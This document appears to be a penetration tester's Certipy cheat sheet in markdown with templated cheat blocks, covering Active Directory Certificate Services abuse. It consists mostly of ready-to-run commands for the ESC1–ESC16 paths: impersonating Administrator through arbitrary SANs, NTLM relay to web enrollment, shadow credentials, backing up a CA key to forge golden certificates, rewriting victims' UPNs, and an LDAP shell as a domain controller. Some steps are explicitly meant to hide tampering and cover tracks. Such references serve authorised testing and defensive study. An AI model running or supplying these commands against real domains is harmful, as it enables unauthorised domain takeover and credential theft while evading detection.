# Certipy

<!-- cheat
export certipy_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := -hashes :$credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k
fi
-->

## certipy (ADCS)

### find

Find find with Certipy.

Enumerate ADCS: pulls CA list, templates, ESC1 through ESC15 vulnerabilities, and ACL findings. `-vulnerable -enabled -text` filters to only published templates with known abuse paths, printed as human readable text.

```sh title:"Certipy Find Find"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import users
import domain_ip
import certipy_auth
-->

## certipy req (Request Certificate)

### req

Read req with Certipy.

Request a certificate from the CA. `-upn` lets you set the SAN, which is what ESC1 abuses to impersonate any principal.

```sh title:"Certipy Read Req"
certipy req -u $user@$domain $auth_flags -ca $ca_name -template $template_name -upn $target_upn -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_name
var template_name
var target_upn
-->

## certipy auth (Authenticate using Certificate)

### auth

Read auth with Certipy.

PKINIT authenticate with a pfx to get a TGT and NT hash for the cert's principal.

```sh title:"Certipy Read Auth"
certipy auth -u $user@$domain $auth_flags -pfx $pfx_file -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var pfx_file
-->

## certipy relay (NTLM Relay to AD CS)

### relay

Run relay with Certipy.

Relay captured NTLM auth to the ADCS web endpoint and request a cert on behalf of the coerced principal. Classic ESC8 attack.

```sh title:"Certipy Run Relay"
certipy relay -u $user@$domain $auth_flags -target http://$target_adcs/certsrv/certfnsh.asp -template $template_name -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var target_adcs
var template_name
-->

## certipy shadow (Shadow Credentials Attack)

### shadow

Dump shadow with Certipy.

Write a Key Credential (`msDS-KeyCredentialLink`) on the target and immediately request a PKINIT cert. `shadow auto` chains the whole primitive.

```sh title:"Certipy Dump Shadow"
certipy shadow auto -target $domain -dc-ip $rhost_ip -username $user@$domain $auth_flags -account $target
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var target
-->

## certipy forge (Forge Certificates from Compromised CA)

### Golden Certificate

Read golden certificate with Certipy.

Forge a cert signed by a stolen CA private key. Works offline, survives CA rotation of user passwords, and lets you impersonate any UPN. Requires `CA.pfx` (usually from DPAPI or LSASS on the CA host).

```sh title:"Certipy Read Golden Certificate"
certipy forge -ca-pfx $ca_pfx -upn $target_upn -subject $target_subject -dc-ip $rhost_ip -out $output_pfx
```
<!-- cheat
import users
import domain_ip
var ca_pfx
var target_upn
var target_subject
var output_pfx
-->

## certipy template (Manage Certificate Templates)

### template dump

Dump template dump with Certipy.

Export a certificate template's full configuration to JSON. Keep the output; `-save-old` in ESC4 flows reads from this to restore the template after exploitation.

```sh title:"Certipy Dump Template Dump"
certipy template -u $user@$domain $auth_flags -template $template_name -dc-ip $rhost_ip -export $template_name.json
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template_name
-->

## certipy account (Manage AD Certificate-Related Attributes)

### new machine account

Create machine account with Certipy.

Create a computer account via LDAP (requires MachineAccountQuota > 0). Needed for ESC6/ESC9/ESC10 flows that depend on a controlled machine principal.

```sh title:"Certipy Create Machine Account"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -add -name $rhost_name -dns $rhost_name
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var rhost_name
-->

## adcs - exec - certipy - remote

### ESC1/ESC2 Step 1 req

Execute ESC1/ESC2 step 1 req with Certipy.

Step 1 of ESC1/ESC2: request a cert from the vulnerable template with `-upn administrator` to put Administrator in the SAN. ESC1 allows arbitrary UPN; ESC2 is any-purpose EKU.

```sh title:"Certipy Execute ESC1/ESC2 Step 1 Req"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC1/ESC2 Step 2 auth

Execute ESC1/ESC2 step 2 auth with Certipy.

Step 2 of ESC1/ESC2: PKINIT with the cert obtained in step 1 to get Administrator's TGT and NT hash.

```sh title:"Certipy Execute ESC1/ESC2 Step 2 Auth"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
-->

### ESC3 Step 1 agent cert

Execute ESC3 step 1 agent cert with Certipy.

Step 1 of ESC3: request an Enrollment Agent cert from the vulnerable template.

```sh title:"Certipy Execute ESC3 Step 1 Agent Cert"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC3 Step 2 on behalf of

Execute ESC3 step 2 on behalf of with Certipy.

Step 2 of ESC3: use the Enrollment Agent cert to request a User cert on behalf of Administrator.

```sh title:"Certipy Execute ESC3 Step 2 on Behalf of"
certipy req -u $user@$domain $auth_flags -ca $ca -template 'User' -on-behalf-of '$domain\administrator' -pfx agent.pfx
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC3 Step 3 auth

Execute ESC3 step 3 auth with Certipy.

Step 3 of ESC3: PKINIT with the on behalf of cert to get Administrator's TGT and NT hash.

```sh title:"Certipy Execute ESC3 Step 3 Auth"
certipy auth -pfx $pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
var pfx
-->

### ESC4 Step 1 save template

Execute ESC4 step 1 save template with Certipy.

Step 1 of ESC4: export the original template config so you can restore it after the attack (`-save-old`).

```sh title:"Certipy Execute ESC4 Step 1 Save Template"
certipy template -u $user@$domain $auth_flags -template $template -save-old -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template
-->

### ESC4 Step 2 abuse

Execute ESC4 step 2 abuse with Certipy.

Step 2 of ESC4: the template was just rewritten to be ESC1 vulnerable; request a cert with administrator UPN.

```sh title:"Certipy Execute ESC4 Step 2 Abuse"
certipy req -u $user@$domain $auth_flags -ca $ca -template $template -upn administrator -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
var template
-->

### ESC4 Step 3 restore

Execute ESC4 step 3 restore with Certipy.

Step 3 of ESC4: load the saved JSON back onto the template to hide the tampering.

```sh title:"Certipy Execute ESC4 Step 3 Restore"
certipy template -u $user@$domain $auth_flags -template $template -configuration $template.json
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var template
-->

### ESC5 backup CA key

Execute ESC5 backup CA key with Certipy.

ESC5 abuses object ACL misconfigurations on the CA itself (or related PKI objects). After gaining write access to a critical PKI object (NTAuthCertificates, AIA, CA computer object), backing up the CA private key gives forge capability.

```sh title:"Certipy Execute ESC5 Backup CA Key"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -config '$ca_fqdn\$ca_config' -backup
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca_config
-->

### ESC5 forge golden cert

Execute ESC5 forge golden cert with Certipy.

Forge a golden certificate from the backed-up CA private key. PKINIT as any principal in the forest.

```sh title:"Certipy Execute ESC5 Forge Golden Cert"
certipy forge -ca-pfx $ca_pfx -upn administrator@$domain -sid $admin_sid -crl 'ldap:///'
```
<!-- cheat
import users
import domain_ip
var ca_pfx
var admin_sid
-->

### ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2

Execute ESC6 EDITF ATTRIBUTESUBJECTALTNAME2 with Certipy.

ESC6: the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, which lets you supply an arbitrary SAN in any cert request (including default User templates). Same flow as ESC1 but the misconfig lives on the CA, not the template.

```sh title:"Certipy Execute ESC6 EDITF ATTRIBUTESUBJECTALTNAME2"
certipy req -u $user@$domain $auth_flags -ca $ca -template User -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC7 add officer

Execute ESC7 add officer with Certipy.

ESC7 Step 1: grant yourself the CA officer role (ManageCA / ManageCertificates) when you have write access to the CA's security descriptor.

```sh title:"Certipy Execute ESC7 Add Officer"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -add-officer $user
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
-->

### ESC7 enable SubCA template

Enable ESC7 enable SubCA template with Certipy.

ESC7 Step 2: enable the built-in SubCA template (disabled by default) so we can request against it.

```sh title:"Certipy Enable ESC7 Enable SubCA Template"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -enable-template SubCA
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
-->

### ESC7 submit SubCA req

Execute ESC7 submit SubCA req with Certipy.

ESC7 Step 3: request SubCA cert with administrator UPN. CA will fail-on-pending; you'll get a request ID to issue manually in the next step.

```sh title:"Certipy Execute ESC7 Submit SubCA Req"
certipy req -u $user@$domain $auth_flags -ca $ca -template SubCA -upn administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca
-->

### ESC7 issue pending request

Execute ESC7 issue pending request with Certipy.

ESC7 Step 4: as a CA officer, approve the pending request to get the cert issued.

```sh title:"Certipy Execute ESC7 Issue Pending Request"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -issue-request $request_id
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var request_id
-->

### ESC7 retrieve issued cert

Execute ESC7 retrieve issued cert with Certipy.

ESC7 Step 5: pull the issued cert by request ID.

```sh title:"Certipy Execute ESC7 Retrieve Issued Cert"
certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -retrieve $request_id
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var request_id
-->

### ESC8 / ESC11 relay to web enrollment

Execute ESC8 / ESC11 relay to web enrollment with Certipy.

ESC8 (HTTP) / ESC11 (RPC) abuse the CA's web enrollment endpoints accepting NTLM. Start the relay; pair with a coercion technique (PetitPotam, Coercer) to force the DC to authenticate. Use `-template DomainController` when relaying a DC$.

```sh title:"Certipy Execute ESC8 / ESC11 Relay to Web Enrollment"
certipy relay -target 'https://$ca_fqdn' -template DomainController
```
<!-- cheat
import domain_ip
var ca_fqdn
-->

### ESC8 relay user

Execute ESC8 relay user with Certipy.

Same relay, but for relaying a user account rather than a machine - drop the `-template` arg to use default User template.

```sh title:"Certipy Execute ESC8 Relay User"
certipy relay -target 'https://$ca_fqdn'
```
<!-- cheat
import domain_ip
var ca_fqdn
-->

### ESC9 update victim UPN

Update ESC9 update victim UPN with Certipy.

ESC9 abuses a template with `CT_FLAG_NO_SECURITY_EXTENSION` (no SID in cert SAN). Step 1: rewrite victim's UPN to administrator (requires GenericWrite or similar on victim).

```sh title:"Certipy Update ESC9 Update Victim UPN"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn administrator -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC9 / ESC10 shadow credentials

Dump ESC9 / ESC10 shadow credentials with Certipy.

If you don't have the victim's password, set msDS-KeyCredentialLink and PKINIT to grab their TGT/NT.

```sh title:"Certipy Dump ESC9 / ESC10 Shadow Credentials"
certipy shadow -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim auto
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC9 request cert as victim

Execute ESC9 request cert as victim with Certipy.

ESC9 Step 2: with victim's Kerberos ticket and the rewritten UPN, request the cert. Cert SAN now claims administrator's UPN but the SID extension is absent, so KDC trusts the UPN.

```sh title:"Certipy Execute ESC9 Request Cert as Victim"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template $template
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca
var template
-->

### ESC9 revert victim UPN

Execute ESC9 revert victim UPN with Certipy.

ESC9 Step 3 (cleanup): restore the victim's original UPN to cover tracks.

```sh title:"Certipy Execute ESC9 Revert Victim UPN"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim@$domain -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var victim
-->

### ESC10 weak certificate mapping

Read ESC10 weak certificate mapping with Certipy.

ESC10 abuses weak certificate mapping in StrongCertificateBindingEnforcement registry. Rewrite victim UPN to target a DC machine account (`DC$`), then PKINIT to LDAP shell as that DC.

```sh title:"Certipy Read ESC10 Weak Certificate Mapping"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn '$dc_name$@$domain' -user $victim update
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var dc_name
var victim
-->

### ESC10 auth as DC$ ldap-shell

Spawn ESC10 auth as DC$ LDAP shell with Certipy.

After requesting the cert as the rewritten victim, PKINIT and drop into an LDAP shell as the impersonated DC$ - good for DCSync, RBCD writes, etc.

```sh title:"Certipy Spawn ESC10 Auth as DC$ LDAP Shell"
certipy auth -pfx $dc_pfx -dc-ip $rhost_ip -ldap-shell
```
<!-- cheat
import domain_ip
var dc_pfx
-->

### ESC15 schema v1 application policy

Read ESC15 schema v1 application policy with Certipy.

ESC15: schema v1 templates accept attacker-supplied Application Policies. Request a cert with explicit `Client Authentication` policy + administrator UPN to bypass EKU restrictions.

```sh title:"Certipy Read ESC15 Schema V1 Application Policy"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template $template -upn administrator@$domain -sid $admin_sid -application-policies 'Client Authentication'
```
<!-- cheat
import users
import domain_ip
import certipy_auth
var ca_fqdn
var ca
var template
var admin_sid
-->

### ESC16 disabled SID security extension

Execute ESC16 disabled SID security extension with Certipy.

ESC16: the CA has the security SID extension disabled globally (msPKI-Enrollment-Flag `CT_FLAG_NO_SECURITY_EXTENSION` set on the CA). Same flow as ESC9 - rewrite victim UPN, request cert as victim, auth as administrator.

```sh title:"Certipy Execute ESC16 Disabled SID Security Extension"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template User
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca
-->
